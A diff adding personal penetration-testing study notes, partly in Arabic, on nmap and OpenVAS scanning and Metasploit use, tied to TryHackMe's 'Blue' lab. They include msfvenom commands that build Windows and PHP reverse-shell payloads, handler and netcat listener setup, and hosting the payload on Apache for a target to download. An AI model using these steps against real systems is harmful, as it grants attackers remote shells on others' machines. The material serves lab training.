@@ -1,0 +1,67 @@
+# Vulnerability Scanning: ==> CVE && Score && Exploit Script
+	- vulners
+	[sudo nmap -sS -v -sV --script vulners.nse 192.168.2.6]
+	- vuln
+	[sudo nmap -sS -v -p 21 --script vuln 192.168.2.8]
+	- openvas ==> Solution && Dynamic Report
+	[sudo apt update]
+	[sudo apt upgrade -y]
+	[sudo apt install openvas]
+	[sudo gvm-setup]
+--------------------------
+# System Hacking:
+	- msfconsole
+	[sudo apt update]
+	[sudo apt install metasploit-framework]
+
+	- search ....  ---------> search "ops name"
+	- info ...     ---------> info [id]
+	- use ...      ---------> use [id]
+	- set RHOSTS ...
+	- run or exploit
+
+[https://tryhackme.com/r/room/blue]
+
+windows/meterpreter/reverse_tcp
+windows/shell/reverse_tcp ==> Statged Payload
+
+windows/shell_reverse_tcp ==> Non-statged && Statgeless payload
+windows/shell_reverse_http
+
+
+msfvenom --list --------> عشان اشوف ليست ال payloads
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -f exe -o reverse.exe
+msfvenom -p php/meterpreter/reverse_tcp LHOST=... LPORT=... -f raw -o reverse.php
+
+ -p عشان احدد ال payload ال هستخدمها
+
+# Listener: جلسة الاستماع
+	# msfconsole
+	# use exploit/multi/handler
+	# set payload ....
+	# set LHOST ...
+	# set LPORT ...
+	# run
+
+	# nc -nlvp 4444
+
+# Scan:
+	# virustotal
+
+# On kali:
+# sudo mkdir /var/www/html/share
+# sudo cp reverse.exe /var/www/html/share
+# service apache2 start
+
+On Windows:
+# internet explorer: ==> 192.168.2.4/share
+==========================
+/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+==========================
+# Tasks:
+	- Recab
+	- Blue
+	- setup openvas
+	- vulners ==> 6 machines
